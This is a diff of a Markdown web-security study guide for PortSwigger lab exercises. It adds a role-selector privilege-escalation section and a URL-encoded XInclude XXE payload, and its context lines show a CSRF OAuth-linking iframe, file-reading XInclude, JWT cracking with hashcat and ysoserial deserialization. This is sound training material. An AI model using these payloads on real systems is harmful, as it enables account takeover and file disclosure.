@@ -12,7 +12,6 @@
 [Brute force](#brute-force)  
   
 **[Privilege Escalation](#privilege-escalation)**  
-[JSON roleid PrivEsc](#privesc-json-roleid)  
 [CSRF Account Takeover](#csrf-account-takeover)  
 [SQL Injection](#sql-injection)  
 [JSON Web Tokens](#jwt)  
@@ -989,7 +988,7 @@ X-Forwarded-For: 12.13.14.15
 
 ![csrf](images/csrf.png)  
 
->Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. Drop the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the ```src``` attribute points to the URL you just copied.  
+>Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. **Drop** the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the ```src``` attribute points to the URL you just copied.  
 
 ```html
 <iframe src="https://TARGET.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
@@ -1431,8 +1430,9 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
   
 ## Access Control  
   
-[PrivEsc JSON RoleId](#privesc-json-roleid)  
+[JSON roleid PrivEsc](#privesc-json-roleid)  
 [Original URL ](#original-url)  
+[Drop Select a role](#drop-select-a-role)  
 
 ### PrivEsc JSON RoleId  
 
@@ -1465,7 +1465,9 @@ Connection: close
 
 [PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
 
->Escalation to administrator is sometimes controlled by a role selector GET request, by **dropping** this GET request before it is presented to the user, the default role of admin is selected and access granted to the admin portal.  
+### Drop Select a role  
+  
+>Escalation to administrator is sometimes controlled by a role selector GET request, by **dropping** the "Please select a role" GET request before it is presented to the user, the default role of **admin** is selected by back-end and access is granted to the admin portal.  
 
 ![Select a role](images/select-a-role.png)  
 
@@ -1512,11 +1514,17 @@ X-Original-URL: /admin
 >Webapp **Check Stock** feature use server-side XML document that is server side parsed inside XML document, and request is not constructed of the entire XML document, it is not possible to use a hosted DTD file. Injecting an **XInclude** statement to retrieve the contents of ```/home/carlos/secret``` file instead.  
 
 ```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>  
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
 ```  
 
 ![XInclude to retrieve files](images/xinclude.png)  
 
+>URL encode the XXE payload before sending.  
+
+```xml
+<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/hostname"/></foo>
+```  
+  
 [PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  
 
 ### DTD Hosted Exploit  
@@ -2172,7 +2180,7 @@ sudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64
 java --version
 ```  
 
-![Switch java version](images/switch-java-version.png)  
+![Switch Java version](images/switch-java-version.png)  
   
 >Now execute ```ysoserial``` to generate base64 payload, using Java version 11. Replace session cookie with generated base64 payload and URL encode only the key characters before sending request.  
 
